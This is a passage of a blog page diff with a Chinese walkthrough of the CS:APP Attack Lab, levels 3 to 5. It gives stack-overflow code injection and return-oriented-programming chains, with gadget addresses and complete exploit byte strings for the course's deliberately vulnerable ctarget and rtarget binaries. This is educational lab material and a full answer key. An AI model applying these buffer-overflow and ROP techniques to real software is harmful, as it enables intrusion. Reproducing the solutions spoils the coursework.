+<li>回想一下，字符串在 C 中表示为字节序列，后跟值为 0 的字节；在任何 Linux 机器上键入 man ascii 以查看所需字符的字节表示形式</li>
+<li>注入的代码应将寄存器 %rdi 设置为此字符串的地址</li>
+<li>当调用函数 hexmatch 和 strncmp 时，它们会将数据推送到堆栈上，覆盖保存 getbuf 使用的缓冲区的内存部分。因此，您需要小心放置 cookie 的字符串表示形式的位置</li>
+</ul>
+</li>
+<li><p>分析 touch3 的汇编代码</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">00000000004018fa &lt;touch3&gt;:</span><br><span class="line">  4018fa:	53                   	push   %rbx				</span><br><span class="line">  4018fb:	48 89 fb             	mov    %rdi,%rbx					# %rbx = %rdi</span><br><span class="line">  4018fe:	c7 05 d4 2b 20 00 03 	movl   $0x3,0x202bd4(%rip)        # 6044dc &lt;vlevel&gt;</span><br><span class="line">  401905:	00 00 00 </span><br><span class="line">  401908:	48 89 fe             	mov    %rdi,%rsi					# %rsi = %rdi</span><br><span class="line">  40190b:	8b 3d d3 2b 20 00    	mov    0x202bd3(%rip),%edi        # 6044e4 &lt;cookie&gt; %edi = cookie</span><br><span class="line">  401911:	e8 36 ff ff ff       	callq  40184c &lt;hexmatch&gt;			# 调用 hexmatch</span><br><span class="line">  401916:	85 c0                	test   %eax,%eax			</span><br><span class="line">  401918:	74 23                	je     40193d &lt;touch3+0x43&gt;			# if %eax == 0，跳转到 40193d</span><br><span class="line">  40191a:	48 89 da             	mov    %rbx,%rdx					# %rdx = %rbx</span><br><span class="line">  40191d:	be 38 31 40 00       	mov    $0x403138,%esi				# %esi = 0x403138</span><br><span class="line">  401922:	bf 01 00 00 00       	mov    $0x1,%edi					# %edi = 0x1</span><br><span class="line">  401927:	b8 00 00 00 00       	mov    $0x0,%eax					# %eax = 0x0</span><br><span class="line">  40192c:	e8 bf f4 ff ff       	callq  400df0 &lt;__printf_chk@plt&gt;	# 调用 print_chk</span><br><span class="line">  401931:	bf 03 00 00 00       	mov    $0x3,%edi					# %edi = 0x3</span><br><span class="line">  401936:	e8 52 03 00 00       	callq  401c8d &lt;validate&gt;			# 调用 validate</span><br><span class="line">  40193b:	eb 21                	jmp    40195e &lt;touch3+0x64&gt;			# 直接跳转到 40195e</span><br><span class="line">  40193d:	48 89 da             	mov    %rbx,%rdx					# %rdx = %rbx</span><br><span class="line">  401940:	be 60 31 40 00       	mov    $0x403160,%esi				# %esi = 0x403160</span><br><span class="line">  401945:	bf 01 00 00 00       	mov    $0x1,%edi					# %edi = x01</span><br><span class="line">  40194a:	b8 00 00 00 00       	mov    $0x0,%eax					# %eax = 0x0</span><br><span class="line">  40194f:	e8 9c f4 ff ff       	callq  400df0 &lt;__printf_chk@plt&gt;	# 调用 print_chk</span><br><span class="line">  401954:	bf 03 00 00 00       	mov    $0x3,%edi					# %edi = 0x3</span><br><span class="line">  401959:	e8 f1 03 00 00       	callq  401d4f &lt;fail&gt;				# 调用 fail</span><br><span class="line">  40195e:	bf 00 00 00 00       	mov    $0x0,%edi					# %edi = 0x0</span><br><span class="line">  401963:	e8 d8 f4 ff ff       	callq  400e40 &lt;exit@plt&gt;			# 调用 exit</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>touch3 调用 hexmatch 将传递的字符串参数和 cookie 比较，如果参数是 cookie 的字符串形式，输出 **”Touch3!: You called touch3(&quot;%s&quot;)\n”**，否则输出 <strong>“Misfire: You called touch3(&quot;%s&quot;)\n”</strong></p>
+</li>
+<li><p>touch3 的起始地址为 <strong>0x4018fa</strong></p>
+</li>
+<li><p>思路分析</p>
+<ul>
+<li><p>通过命令 man ascii 查看 cookie 的字符串 “59b997fa” 的字节级表示为 <strong>35 39 62 39 39 37 66 61</strong></p>
+</li>
+<li><p>说明文档提醒我们 hexmatch 可能会覆盖 getbuf 的缓冲区，因此我们不能将字符串存储在 getbuf 的栈帧中，但我们可以把它存储在 test 的栈帧中</p>
+</li>
+<li><p>通过栈溢出的方式，修改 getbuf 的返回地址为 getbuf 的 %rsp 并将 cookie 的字符串的字节级表示存储在 test 的栈帧中</p>
+</li>
+<li><p>通过getbuf 将注入代码存储在 getbuf 的栈帧中</p>
+</li>
+<li><p>注入代码将存储在 test 栈帧中的字符串设置为 touch3 的参数，并跳转到 touch3 的起始地址</p>
+</li>
+</ul>
+</li>
+<li><p>我们需要 test 的 %rsp 来确定存储在 test 栈帧中的 cookie 字符串的起始地址</p>
+</li>
+<li><p>通过 gdb 调试工具在 getbuf 的 0x4017a8 处设置断点，查看 test 的 %rsp 的值为 <strong>0x5561dca0</strong>，所以 test 栈帧存储字符串的起始地址为 <strong>0x5561dca8</strong></p>
+</li>
+</ul>
+<img src="/2024/03/11/CSAPP-Lab3/image-20240313115138026.png" class="" title="image-20240313115138026">
+
+<h2 id="Solution-2"><a href="#Solution-2" class="headerlink" title="Solution"></a>Solution</h2><ul>
+<li>getbuf 的 %rsp 仍然为 <strong>0x5561dc78</strong></li>
+<li>创建 Level3.s 文件，写入注入代码</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movq $0x5561dca8,%rdi</span><br><span class="line">pushq $0x4018fa</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>通过命令 <strong>gcc -c Level3.s</strong> 生成二进制文件 Level3.o</li>
+<li>通过命令 <strong>objdump -d Level3.o &gt; Level3.d</strong> 得到 Level3.d，汇编代码的字节级表示</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Level3.o：     文件格式 elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:	48 c7 c7 a8 dc 61 55 	mov    $0x5561dca8,%rdi</span><br><span class="line">   7:	68 fa 18 40 00       	pushq  $0x4018fa</span><br><span class="line">   c:	c3                   	retq   </span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>创建 Level3.txt 文件，写入输入值的字节级表示</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">48</span> c7 c7 a8 dc <span class="number">61</span> <span class="number">55</span> <span class="number">68</span>	<span class="comment">// 指令的字节级表示</span></span><br><span class="line">fa <span class="number">18</span> <span class="number">40</span> <span class="number">00</span> c3 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">78</span> dc <span class="number">61</span> <span class="number">55</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>	<span class="comment">// getbuf 的 %rsp</span></span><br><span class="line"><span class="number">35</span> <span class="number">39</span> <span class="number">62</span> <span class="number">39</span> <span class="number">39</span> <span class="number">37</span> <span class="number">66</span> <span class="number">61</span>	<span class="comment">// 字符串的字节级表示</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>通过命令 <strong>.&#x2F;hex2raw &lt; Level3.txt | .&#x2F;ctarget -q</strong> 运行程序</li>
+</ul>
+<h2 id="Result-2"><a href="#Result-2" class="headerlink" title="Result"></a>Result</h2><ul>
+<li><strong>运行结果</strong></li>
+</ul>
+<img src="/2024/03/11/CSAPP-Lab3/image-20240313120319386.png" class="" title="image-20240313120319386">
+
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul>
+<li>在使用 gdb 设置断点得到字符串在 test 栈帧中的地址时，发现的一些问题</li>
+<li>第一次设置的断点在 test 的 0x40196c，得到 %rsp &#x3D; 0x5561dca8，所以推测字符串在 test 栈帧中存放在 0x5561dcd0，果不其然是错的</li>
+<li>第二次设置的断点在 getbuf 的 0x4017a8，得到 test 的 %rsp &#x3D; 0x5561dca0，所以推测字符串存放在 0x5561dca8，是正确的</li>
+<li>说明 test 在调用 getbuf 时，又额外分配了 8 字节的空间来存放返回地址</li>
+</ul>
+<h1 id="Return-Oriented-Programming"><a href="#Return-Oriented-Programming" class="headerlink" title="Return-Oriented Programming"></a>Return-Oriented Programming</h1><ul>
+<li><p>对程序 RTARGET 执行代码注入攻击比对 CTARGET 要困难得多，因为它使用两种技术来阻止此类攻击：</p>
+<ul>
+<li>它使用随机化，使堆栈位置在一次运行中不同，这样就无法确定注入的代码将位于何处</li>
+<li>它将保存堆栈的内存部分标记为不可执行，因此即使您可以将程序计数器设置为注入代码的开头，程序也会因分段错误而失败</li>
+</ul>
+</li>
+<li><p>但我们可以通过执行现有代码而不是注入新代码来在程序中完成有用的事情</p>
+</li>
+<li><p>例如有一个 C 函数</p>
+</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">setval_210</span><span class="params">(<span class="type">unsigned</span> *p)</span></span><br><span class="line">&#123;</span><br><span class="line">	*p = <span class="number">3347663060U</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>它的汇编代码如下</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0000000000400f15 &lt;setval_210&gt;:</span><br><span class="line">400f15: c7 07 d4 48 89 c7 		movl $0xc78948d4,(%rdi)</span><br><span class="line">400f1b: c3 						retq</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>我们发现字节序列 48 89 c7 对指令 movq %rax,%rdi 编码、c3 对 ret 编码，这样我们就有了一个从 0x400f18 开始的小工具，它将复制寄存器 %rax 中的 64 位值到寄存器 %rdi</p>
+</li>
+<li><p>我们可以通过将这些小工具的地址放入栈中，每个小工具由一系列条指令和最后一个字节序列为 0xc3 编码的 ret 指令构成</p>
+</li>
+<li><p>当我们从配置的起始地址开始执行时，每个小工具的 ret 指令会跳转到下一个小工具的开头，从而执行一系列 n 个小工具</p>
+</li>
+</ul>
+<img src="/2024/03/11/CSAPP-Lab3/image-20240313153659095.png" class="" title="image-20240313153659095">
+
+<ul>
+<li><p>说明文档的提醒</p>
+<ul>
+<li>小工具场由 rtarget 副本中的函数 start_farm 和 end_farm 划分</li>
+<li>不要尝试从程序代码的其他部分构造小工具</li>
+</ul>
+</li>
+<li><p>一些指令对应的字节级表示</p>
+</li>
+</ul>
+<img src="/2024/03/11/CSAPP-Lab3/image-20240313154452626.png" class="" title="image-20240313154452626">
+
+<h1 id="Level-4"><a href="#Level-4" class="headerlink" title="Level 4"></a>Level 4</h1><ul>
+<li>要求<ul>
+<li>重复 Level2 的攻击，但使用小工具在程序 RTARGET 上执行此操作。</li>
+<li>可以使用包含 movq、popq、ret、nop 指令类型的小工具构建解决方案</li>
+<li>仅使用前 8 个 x86-64 寄存器 （%rax – %rdi）</li>
+</ul>
+</li>
+<li>说明文档的一些建议<ul>
+<li>您需要的所有小工具都可以在 rtarget 代码区域中找到，该代码区域由函数 start_farm 和 mid_farm 分隔</li>
+<li>当小工具使用 popq 指令时，它会从堆栈中弹出数据。因此，您的漏洞利用字符串将包含小工具地址和数据的组合</li>
+</ul>
+</li>
+<li>通过命令：<strong>objdump -d .&#x2F;rtarget&gt;&gt; rtarget.s</strong> 得到 rtarget.s 文件</li>
+<li>思路分析<ul>
+<li>通过 popq %rdi 将存放在栈中的 cookie 放入 %rdi</li>
+<li>再通过 ret 取出并执行 touch2 的起始地址，实现跳转</li>
+<li>popq %rdi 是字节序列为 <strong>5f</strong>，在 rtarget 的 start_farm 和 mid_farm 间并没有找到包含 5f 的字节序列，所以我们需要通过另一个寄存器中转</li>
+<li>0x4019a7 处有字节序列 8d 87 51 73 58 90，取 <strong>0x4019ab</strong> 处 58 90 编码为 movq %rax nop，将 cookie 先存放在 %rax</li>
+<li>0x4019c3 处有字节序列 c7 07 48 89 c7 90，取 <strong>0x4019c5</strong>  处 48 89 c7 90 编码为 movq %rax,%rdi nop，再将 cookie 从 %rax 传递到 %rdi</li>
+</ul>
+</li>
+</ul>
+<h2 id="Solution-3"><a href="#Solution-3" class="headerlink" title="Solution"></a>Solution</h2><ul>
+<li>cookie 值为 0x59b997fa</li>
+<li>touch2 的起始地址为 0x4017ec</li>
+<li>创建 Level4.txt 文件，写入输入值的字节级表示</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">ab <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>	<span class="comment">// popq %rax ret</span></span><br><span class="line">fa <span class="number">97</span> b9 <span class="number">59</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>	<span class="comment">// cookie </span></span><br><span class="line">c5 <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>	<span class="comment">// moveq %rax,%rdi ret </span></span><br><span class="line">ec <span class="number">17</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="comment">// touch2 的起始地址</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>通过命令 <strong>.&#x2F;hex2raw &lt; Level4.txt | .&#x2F;rtarget -q</strong> 运行程序</li>
+</ul>
+<h2 id="Result-3"><a href="#Result-3" class="headerlink" title="Result"></a>Result</h2><ul>
+<li><strong>运行结果</strong></li>
+</ul>
+<img src="/2024/03/11/CSAPP-Lab3/image-20240314103504643.png" class="" title="image-20240314103504643">
+
+
+
+<h1 id="Level-5"><a href="#Level-5" class="headerlink" title="Level 5"></a>Level 5</h1><ul>
+<li><p>官方劝退</p>
+<ul>
+<li><p>在你进入第 5 阶段之前，请停下来考虑一下到目前为止你所取得的成就</p>
+</li>
+<li><p>在第 2 阶段和第 3 阶段，您让程序执行您自己设计的机器代码。如果 CTARGET 是一个网络服务器，你可以将自己的代码注入到遥远的机器中</p>
+</li>
+<li><p>在第 4 阶段中，您规避了现代系统用来阻止缓冲区溢出攻击的两个主要设备。虽然您没有注入自己的代码，但您可以注入一种通过将现有代码序列拼接在一起来运行的程序</p>
+</li>
+<li><p>您还获得了 95&#x2F;100 的实验室分数。这是一个很好的分数。如果您有其他紧迫的义务，请考虑立即停止</p>
+</li>
+<li><p>第 5 阶段要求您对 RTARGET 进行 ROP 攻击，以使用指向 cookie 的字符串表示形式的指针调用函数 touch3</p>
+</li>
+<li><p>这似乎并不比使用 ROP 攻击调用 touch2 困难得多，只是我们已经做到了</p>
+</li>
+<li><p>此外，第 5 阶段只计算 5 分，这并不是衡量它所需努力的真实衡量标准。对于那些想要超越课程正常期望的人来说，这更像是一个额外的学分问题</p>
+</li>
+</ul>
+</li>
+<li><p>说明文档的一些建议</p>
+<ul>
+<li><p>您可以在 rtarget 中由函数 start_farm 和 end_farm 分隔的代码区域中使用小工具，除了第 4 阶段中使用的小工具外，这个扩展的农场还包括不同 movl 指令的编码</p>
+</li>
+<li><p>服务器场的这一部分中的字节序列还包含用作功能 nop 的 2 字节指令，即它们不会更改任何寄存器或内存值</p>
+</li>
+</ul>
+</li>
+<li><p>思路分析</p>
+<ul>
+<li>%rsp 的地址值不能通过 gdb 调试工具确定，但我们可以执行 movq %rsp,%rdi 相关的指令得到 %rsp</li>
+<li>不能简单的将 cookie 字符串存储在 %rsp，因为执行 movq %rsp,%rdi 后执行 ret，会取出并执行 cookie 字符串，造成错误</li>
+<li>可以将 cookie 字符串存储在 touch3 起始地址后边，ret 取出执行 touch3 的起始地址</li>
+<li>start_farm 和 end_farm 间有一个特殊的指令 <strong>lea (%rdi,%rsi,1),%rax</strong>， 我们事先计算好 cookie 字符串距离 %rsp 的偏移量，通过 %rsp + 偏移量将 cookie 字符串的起始地址赋给 %rdi</li>
+</ul>
+</li>
+<li><p>想法很美好，现实很骨感！并不是需要哪些指令，就有哪些指令的 …… 我们需要东拼西凑实现我们的想法</p>
+</li>
+<li><p>具体实现如下</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">movq %rsp,%rax 			# 0x401a06	（得到 %rsp）</span><br><span class="line">ret</span><br><span class="line">movq %rax,%rdi			# 0x4019c5	（将 %rsp 赋值给 %rdi 用作计算）</span><br><span class="line">ret</span><br><span class="line">popq %rax				# 0x4019ab	（弹出偏移量到 %rax）</span><br><span class="line">ret</span><br><span class="line"># 偏移量</span><br><span class="line">movq %eax,%edx 			# 0x4019dd	（转移偏移量到 %esi）</span><br><span class="line">ret</span><br><span class="line">movq %edx,%ecx			# 0x401a69</span><br><span class="line">ret</span><br><span class="line">movq %ecx,%esi			# 0x401a13</span><br><span class="line">ret</span><br><span class="line">lea (%rdi,%rsi,1),%rax	# 0x4019d6	（计算字符串的起始地址）</span><br><span class="line">ret</span><br><span class="line">movq %rax,%rdi			# 0x4019c5	（将字符串起始地址赋给 %rdi 作为 touch3 的参数）</span><br><span class="line">ret						#			（取出并执行 touch3）</span><br><span class="line"># touch3 起始地址</span><br><span class="line"># cookie</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>说明文档提醒我们，有些字节序列还包含用作功能 nop 的 2 字节指令，比如 0x401a69 处 89 d1 08 db，89 d1 编码为 movl %edx,%ecx，08 db 实测没有什么影响</p>
+</blockquote>
+<ul>
+<li>ret，%rsp +&#x3D; 8，popq，%rsp -&#x3D; 8，所以偏移量为：<strong>0x48（72）</strong></li>
+</ul>
+<h2 id="Solution-4"><a href="#Solution-4" class="headerlink" title="Solution"></a>Solution</h2><ul>
+<li>touch3 的起始地址 0x4018fa</li>
+<li>cookie 字符串形式的字节级表示 35 39 62 39 39 37 66 61</li>
+<li>创建 Level5.txt 文件，写入输入值的字节级表示</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>	</span><br><span class="line"><span class="number">06</span> <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>	<span class="comment">// movq %rsp,%rax</span></span><br><span class="line">c5 <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>	<span class="comment">// movq %rax,%rdi	</span></span><br><span class="line">ab <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>	<span class="comment">// popq %rax</span></span><br><span class="line"><span class="number">48</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>	<span class="comment">// 偏移量</span></span><br><span class="line">dd <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>	<span class="comment">// movl %eax,%edx</span></span><br><span class="line"><span class="number">69</span> <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>	<span class="comment">// movl %edx,%ecx</span></span><br><span class="line"><span class="number">13</span> <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>	<span class="comment">// movl %ecx,%esi</span></span><br><span class="line">d6 <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>	<span class="comment">// lea (%rdi,%rsi,1),%rax</span></span><br><span class="line">c5 <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>	<span class="comment">// movq %rax,%rdi</span></span><br><span class="line">fa <span class="number">18</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>	<span class="comment">// touch3 起始地址</span></span><br><span class="line"><span class="number">35</span> <span class="number">39</span> <span class="number">62</span> <span class="number">39</span> <span class="number">39</span> <span class="number">37</span> <span class="number">66</span> <span class="number">61</span>	<span class="comment">// cookie 字符串</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>通过命令 <strong>.&#x2F;hex2raw &lt; Level5.txt | .&#x2F;rtarget -q</strong> 运行程序</li>
+</ul>
+<h2 id="Result-4"><a href="#Result-4" class="headerlink" title="Result"></a>Result</h2><ul>
+<li><strong>运行结果</strong></li>
+</ul>
+<img src="/2024/03/11/CSAPP-Lab3/image-20240315092444544.png" class="" title="image-20240315092444544">
+
+<h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/JayL-zxl/p/14361158.html">图文并茂-超详解 CS:APP: Lab3-Attack（附带栈帧分析) - 周小伦 - 博客园 (cnblogs.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/476396465">CSAPP | Lab3-Attack Lab 深入解析 - 知乎 (zhihu.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.viseator.com/2017/07/18/CS_APP_AttackLab/#%E5%AE%9E%E9%AA%8C%E5%B0%8F%E7%BB%93">深入理解计算机系统（CS:APP) - Attack Lab详解 | viseator’s blog</a></p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/410418053">csapp-attacklab 详解 - 知乎 (zhihu.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/C__C_/article/details/111308959">CSAPP实验——AttackLab_csapp attack lab-CSDN博客</a></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://yiweiboi.github.io/2024/03/05/CSAPP-Lab2/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1592,7 +2500,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">12</span>
+          <span class="site-state-item-count">14</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
